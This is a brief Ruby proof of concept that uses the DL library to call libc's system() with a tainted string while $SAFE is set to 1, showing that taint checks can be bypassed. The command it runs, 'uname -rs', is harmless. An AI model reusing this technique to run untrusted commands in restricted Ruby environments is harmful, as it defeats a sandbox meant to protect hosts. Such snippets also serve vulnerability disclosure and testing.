require 'dl'
$SAFE = 1
h = DL.dlopen(nil)
sys = h.sym('system', 'IP')
uname = 'uname -rs'.taint
sys[uname]
